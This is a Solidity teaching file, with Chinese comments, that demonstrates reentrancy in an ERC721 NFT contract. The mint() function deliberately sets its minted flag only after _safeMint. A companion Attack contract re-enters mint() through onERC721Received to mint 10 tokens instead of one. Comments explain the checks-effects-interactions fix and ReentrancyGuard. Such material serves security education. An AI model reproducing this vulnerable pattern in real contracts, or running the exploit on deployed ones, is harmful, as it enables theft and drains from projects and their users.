// SPDX-License-Identifier: MIT

pragma solidity ^0.8.21;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

/**
* @title NFT contract with Reentrancy Vulnerability
*/
contract NFTReentrancy is ERC721 {
    uint256 public totalSupply;
    mapping(address => bool) public mintedAddress;

    // 构造函数，初始化NFT合集的名称、代号
    constructor() ERC721("Reentry NFT", "ReNFT"){}

    // 铸造函数，每个用户只能铸造1个NFT
    // 有重入漏洞
    function mint() payable external {
        // 检查是否mint过
        require(mintedAddress[msg.sender] == false);
        // 增加total supply
        totalSupply++;
        // mint
        _safeMint(msg.sender, totalSupply);
        // 记录mint过的地址
        mintedAddress[msg.sender] = true;

        // 预防方法
        // 1. 检查-影响-交互模式：它强调编写函数时，要先检查状态变量是否符合要求，
        // 紧接着更新状态变量（例如余额），最后再和别的合约交互。
        // 我们可以用这个模式修复有漏洞的mint()函数:
        // // 记录mint过的地址
        // mintedAddress[msg.sender] = true;
        // // mint
        // _safeMint(msg.sender, totalSupply);

        // 2. 重入锁：它是一种防止重入函数的修饰器（modifier）。
        // 建议直接使用OpenZeppelin提供的ReentrancyGuard
    }
}

contract Attack is IERC721Receiver{
    NFTReentrancy public nft; // 有漏洞的nft合约地址

    // 初始化NFT合约地址
    constructor(NFTReentrancy _nftAddr) {
        nft = _nftAddr;
    }
    
    // 攻击函数，发起攻击
    function attack() external {
        nft.mint();
    }

    // ERC721的回调函数，会重复调用mint函数，铸造10个
    function onERC721Received(address, address, uint256, bytes memory) public virtual override returns (bytes4) {
        if(nft.balanceOf(address(this)) < 10){
            nft.mint();
        }
        return this.onERC721Received.selector;
    }
}